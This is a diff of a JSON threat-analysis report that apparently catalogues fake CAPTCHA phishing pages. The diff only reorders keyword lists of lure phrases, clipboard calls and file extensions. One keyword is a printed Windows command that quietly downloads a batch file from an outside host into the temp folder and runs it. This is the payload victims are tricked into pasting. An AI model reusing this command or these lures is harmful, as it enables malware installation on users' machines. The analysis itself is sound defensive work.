@@ -49,8 +49,8 @@
           "count": 4,
           "description": "Executing clipboard copy operations",
           "examples": [
-            "execCommand(\"copy\"",
-            "navigator.clipboard"
+            "navigator.clipboard",
+            "execCommand(\"copy\""
           ]
         },
         "Cleanup Operations": {
@@ -88,26 +88,26 @@
     "keyword_analysis": {
       "categories": {
         "Social Engineering": [
-          "captcha-container",
-          "Captcha",
-          "CaptchaListeners",
-          "verification_id",
-          "CaptchaLoading",
-          "verification ID",
           "verification-id",
-          "CaptchaCheckbox",
-          "CAPTCHA",
-          "verification",
-          "Verify you are human",
-          "cmd = 'cmd /c start /min cmd.exe /c \"curi -L \"https://pumpfun.exposed/a.cmd\" -o \"%temp%\\\\verification.txt.bat\" && caii \"%temp%\\\\verification.txt.bat\"\"';",
-          "Robot",
-          "captcha-iogo",
-          "CAPTCHA Verification",
           "I am not a robot",
-          "Verification",
-          "robot",
+          "captcha-iogo",
+          "Verify you are human",
+          "Robot",
+          "CaptchaCheckbox",
+          "verification",
+          "captcha-container",
+          "CAPTCHA",
+          "CaptchaLoading",
+          "cmd = 'cmd /c start /min cmd.exe /c \"curi -L \"https://pumpfun.exposed/a.cmd\" -o \"%temp%\\\\verification.txt.bat\" && caii \"%temp%\\\\verification.txt.bat\"\"';",
+          "verification_id",
           "To better prove you are not a robot",
+          "Verification",
+          "CAPTCHA Verification",
           "Checking if you are human",
+          "verification ID",
+          "Captcha",
+          "robot",
+          "CaptchaListeners",
           "Verification ID"
         ],
         "System Commands": [
@@ -117,11 +117,11 @@
           "hidden"
         ],
         "Technical Terms": [
-          "failed_to_retrieve",
-          ".exe",
+          ".bat",
           "Ray ID",
           "iex",
-          ".bat"
+          "failed_to_retrieve",
+          ".exe"
         ]
       },
       "similar_groups": [
